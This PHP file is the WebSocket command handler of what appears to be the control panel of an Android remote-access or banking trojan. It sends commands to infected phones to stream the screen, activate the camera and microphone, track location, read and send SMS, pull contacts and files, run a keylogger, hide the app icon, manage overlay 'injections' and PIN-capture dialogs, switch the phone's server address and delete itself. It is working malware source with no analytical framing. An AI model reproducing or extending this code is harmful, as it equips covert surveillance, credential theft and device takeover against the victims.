<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\Handlers\Concerns\AuthorizesDeviceAccess;
use App\WebSocket\Messages\WebSocketMessage;
use App\WebSocket\WebSocketLog;

final class PanelSendHandler
{
    use AuthorizesDeviceAccess;

    private ConnectionManager $connectionManager;

    public function __construct(ConnectionManager $connectionManager)
    {
        $this->connectionManager = $connectionManager;
    }

    public function handle(int $fd, WebSocketMessage $message): void
    {
        $phoneId = $this->authorizeDeviceAccess($fd, $message, $this->connectionManager);
        if ($phoneId === null) {
            return;
        }

        $subc = $message->subc();

        $this->logOperation($subc ?? 'unknown', $phoneId);

        match ($subc) {
            'screen' => $this->handleScreen($phoneId, $message),
            'cam', 'camoff' => $this->handleCamera($phoneId, $message),
            'mic', 'micoff' => $this->handleMicrophone($phoneId, $message),
            'loc', 'locoff' => $this->handleLocation($phoneId, $message),
            'SMS' => $this->handleSms($phoneId),
            'SMSSEND' => $this->handleSmsSend($phoneId, $message),
            'Contacts' => $this->handleContacts($phoneId),
            'files' => $this->handleFiles($phoneId, $message),
            'changefiles' => $this->handleChangeFiles($phoneId, $message),
            'viewfile' => $this->handleViewFile($phoneId, $message),
            'Keylog' => $this->handleKeylog($phoneId, $message),
            'Logdate' => $this->handleLogdate($phoneId, $message),
            'LOADAPPS' => $this->handleLoadApps($phoneId),
            'OPENAPP' => $this->handleOpenApp($phoneId, $message),
            'UNINSTALLAPP' => $this->handleUninstallApp($phoneId, $message),
            'Hideico' => $this->handleHideIcon($phoneId),
            'activz', 'notifys', 'vapps', 'vlinks' => $this->handleActivityRecords($phoneId, $message),
            'Permissions' => $this->handlePermissions($phoneId, $message),
            'Notify' => $this->handleNotify($phoneId, $message),
            'rename' => $this->handleRename($phoneId, $message),
            'change' => $this->handleChange($phoneId, $message),
            'delete' => $this->handleDelete($phoneId),
            'DIAO' => $this->handleDialog($phoneId, $message),
            'OPENINJ' => $this->handleOpenInject($phoneId),
            'noinj' => $this->handleNoInject($phoneId, $message),
            'display' => $this->handleDisplay($phoneId, $message),
            'getinject' => $this->handleGetInject($phoneId),
            default => $this->forwardToDevice($phoneId, $message),
        };
    }

    private function handleScreen(string $phoneId, WebSocketMessage $message): void
    {
        // 投屏命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Screen (大写S), comdtype=SM/SN/SK/SMOFF/SNOFF/SKOFF
        $screentype = $message->getString('screentype');

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Screen',
            'comdtype' => $screentype,
        ]);
    }

    private function handleCamera(string $phoneId, WebSocketMessage $message): void
    {
        // 相机命令格式（参考 Node.js 原始实现）:
        // cam → type=screencomd, subc=Camera, SelectedCam
        // camoff → type=screencomd, subc=CameraOff
        $subc = $message->subc();

        if ($subc === 'cam') {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'screencomd',
                'subc' => 'Camera',
                'SelectedCam' => $message->getString('SelectedCam'),
            ]);
        } else {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'screencomd',
                'subc' => 'CameraOff',
            ]);
        }
    }

    private function handleMicrophone(string $phoneId, WebSocketMessage $message): void
    {
        // 麦克风命令格式（参考 Node.js 原始实现）:
        // mic → type=mic, subc=ON
        // micoff → type=mic, subc=OFF
        $subc = $message->subc();
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'mic',
            'subc' => $this->microphoneCommandLabel($subc),
        ]);
    }

    private function handleLocation(string $phoneId, WebSocketMessage $message): void
    {
        // 定位命令格式（参考 Node.js 原始实现）:
        // loc → type=screencomd, subc=Location
        // locoff → type=screencomd, subc=Locationoff
        $subc = $message->subc();
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => $this->locationCommandLabel($subc),
        ]);
    }

    private function handleSms(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'SMS',
        ]);
    }

    private function handleSmsSend(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'SMSSEND',
            'smsnumber' => $message->getString('smsnumber'),
            'message' => $message->getString('message'),
        ]);
    }

    private function handleContacts(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Contacts',
        ]);
    }

    private function handleFiles(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'files',
            'filepath' => $message->getString('filepath'),
        ]);
    }

    private function handleChangeFiles(string $phoneId, WebSocketMessage $message): void
    {
        $comdtype = $message->getString('comdtype');

        // Upload (U) requires chunking - split into 256KB chunks as per Node.js
        if ($comdtype === 'U') {
            $this->sendFileInChunks($phoneId, $message, $message->getString('content'));

            return;
        }

        // Delete (R) / Download (D) - send as-is
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'changefiles',
            'comdtype' => $comdtype,
            'filepath' => $message->getString('filepath'),
            'filetype' => $message->getString('filetype'),
            'filename' => $message->getString('filename'),
            'size' => $message->getString('size'),
            'content' => $message->getString('content'),
        ]);
    }

    private function sendFileInChunks(string $phoneId, WebSocketMessage $message, string $content): void
    {
        $chunkSize = 256 * 1024; // 256KB per chunk
        $totalSize = strlen($content);
        $totalChunks = $totalSize > 0 ? (int) ceil($totalSize / $chunkSize) : 1;

        for ($index = 0; $index < $totalChunks; $index++) {
            $chunk = substr($content, $index * $chunkSize, $chunkSize);
            $this->connectionManager->sendToDevice($phoneId, $this->buildFileChunkPayload($message, $chunk, $index, $totalChunks));
        }
    }

    private function buildFileChunkPayload(WebSocketMessage $message, string $chunk, int $index, int $totalChunks): array
    {
        return [
            'type' => 'screencomd',
            'subc' => 'changefiles',
            'comdtype' => $message->getString('comdtype'),
            'isinjct' => $message->getString('isinjct'),
            'jctid' => $message->getString('jctid'),
            'filepath' => $message->getString('filepath'),
            'filetype' => $message->getString('filetype'),
            'filename' => $message->getString('filename'),
            'size' => $message->getString('size'),
            'chunkIndex' => $index,
            'totalChunks' => $totalChunks,
            'content' => $chunk,
        ];
    }

    private function handleViewFile(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'viewfile',
            'filepath' => $message->getString('filepath'),
        ]);
    }

    private function handleKeylog(string $phoneId, WebSocketMessage $message): void
    {
        // 键盘监听命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Keylog, comdtype=0(开启)/1(关闭)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Keylog',
            'comdtype' => $message->getString('keylogtype'),
        ]);
    }

    private function handleLogdate(string $phoneId, WebSocketMessage $message): void
    {
        // 键盘日志日期查询命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Logdate, comdtype, kdate
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Logdate',
            'comdtype' => $message->getString('keylogtype'),
            'kdate' => $message->getString('keylogdate'),
        ]);
    }

    private function handleLoadApps(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'LOADAPPS',
        ]);
    }

    private function handleOpenApp(string $phoneId, WebSocketMessage $message): void
    {
        // 打开应用命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=OPENAPP, package (不是 packageName)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'OPENAPP',
            'package' => $message->getString('packageName'),
        ]);
    }

    private function handleUninstallApp(string $phoneId, WebSocketMessage $message): void
    {
        // 卸载应用命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=UNINSTALLAPP, package (不是 packageName)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'UNINSTALLAPP',
            'package' => $message->getString('packageName'),
        ]);
    }

    private function handleHideIcon(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Hideico',
        ]);
    }

    private function handleActivityRecords(string $phoneId, WebSocketMessage $message): void
    {
        $commandType = $message->subc() ?? '';
        $action = $message->getString('action', 'L');  // L=list/get, D=delete (from inner subc in Node.js)
        $kdate = $message->getString('kdate');

        // Map command to Node.js protocol: type="Activitys", subc=GA/DA/GF/DF/GV/DV/GU/DU
        $subcMap = [
            'activz' => ['L' => 'GA', 'D' => 'DA'],   // Activities
            'notifys' => ['L' => 'GF', 'D' => 'DF'],  // Notifications
            'vapps' => ['L' => 'GV', 'D' => 'DV'],    // Visited Apps
            'vlinks' => ['L' => 'GU', 'D' => 'DU'],   // Visited Links
        ];

        $mappedSubc = $subcMap[$commandType][$action] ?? null;

        if ($mappedSubc === null) {
            return;
        }

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Activitys',
            'subc' => $mappedSubc,
            'kdate' => $kdate,
        ]);
    }

    private function handlePermissions(string $phoneId, WebSocketMessage $message): void
    {
        $action = $message->getString('action');

        if ($action === 'R' && $message->has('prim')) {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'Permissions',
                'subc' => 'R',
                'prim' => $message->getString('prim'),
            ]);
        }
    }

    private function handleRename(string $phoneId, WebSocketMessage $message): void
    {
        // 重命名命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Rename (大写R), name (不是 nam)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Rename',
            'name' => $message->getString('nam'),
        ]);
    }

    private function handleChange(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'change',
            'domain' => $message->getString('domain'),
            'ip' => $message->getString('ip'),
            'changeid' => $message->getString('changeid'),
        ]);
    }

    private function handleDelete(string $phoneId): void
    {
        // Node.js: type="Delete", subc="[reme]"
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Delete',
            'subc' => '[reme]',
        ]);
    }

    private function handleDialog(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'DIAO',
            'pin' => $message->getString('pin'),
            'title' => $message->getString('title'),
            'lckdis' => $message->getString('lckdis'),
            'typ' => $message->getString('typ'),
        ]);
    }

    private function handleOpenInject(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'OPENINJ',
        ]);
    }

    private function handleNoInject(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'noinj',
            'jctid' => $message->getString('jctid'),
        ]);
    }

    private function handleDisplay(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'display',
            'display' => $message->getString('display'),
        ]);
    }

    private function handleGetInject(string $phoneId): void
    {
        // 获取注入记录命令（参考 Node.js 原始实现）
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'getinject',
        ]);
    }

    private function handleNotify(string $phoneId, WebSocketMessage $message): void
    {
        // Node.js: type="Notifi", noti field
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Notifi',
            'noti' => $message->getString('noti'),
        ]);
    }

    private function microphoneCommandLabel(string $subc): string
    {
        return $subc === 'mic' ? 'ON' : 'OFF';
    }

    private function locationCommandLabel(string $subc): string
    {
        return $subc === 'loc' ? 'Location' : 'Locationoff';
    }

    private function forwardToDevice(string $phoneId, WebSocketMessage $message): void
    {
        $deviceData = array_merge($message->toArray(), ['type' => 'screencomd']);
        unset($deviceData['itype'], $deviceData['pid']);

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function logOperation(string $logType, string $phoneId): void
    {
        WebSocketLog::getLogger()->info("Operation: {$logType}", [
            'phone_id' => $phoneId,
        ]);
    }
}
